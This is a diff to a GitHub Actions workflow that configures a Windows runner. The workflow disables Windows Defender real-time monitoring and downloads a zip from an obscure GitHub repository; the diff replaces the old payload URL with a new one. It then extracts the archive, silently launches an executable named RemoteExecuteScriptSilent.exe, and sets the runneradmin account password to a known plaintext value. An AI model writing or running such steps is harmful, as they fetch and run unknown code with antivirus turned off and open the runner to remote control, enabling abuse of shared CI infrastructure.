@@ -22,12 +22,12 @@ jobs:
       run: New-Item -Path "C:\1" -ItemType Directory
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
-    - name: 14
-      run: Invoke-WebRequest -URI https://github.com/thomas12Garcia/1231fdgfdg423/raw/refs/heads/main/RegMikroMan222.zip -outfile c:\21\RegMikroMan222.zip
+    - name: 5
+      run: Invoke-WebRequest -URI https://github.com/james81Evans/xgcr9upszpaulsusan/raw/refs/heads/main/Skript.zip -outfile c:\21\Skript.zip
     - name: 7
-      run: Expand-Archive -LiteralPath "c:\21\RegMikroMan222.zip" -DestinationPath "C:\21"
+      run: Expand-Archive -LiteralPath "c:\21\Skript.zip" -DestinationPath "C:\21"
     - name: 15
-      run: Start-Process Powershell ' -Command "C:\21\RegMikroMan222\RemoteExecuteScriptSilent.exe"'
+      run: Start-Process Powershell ' -Command "C:\21\Skript\RemoteExecuteScriptSilent.exe"'
     - name: 10
       run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: Download.
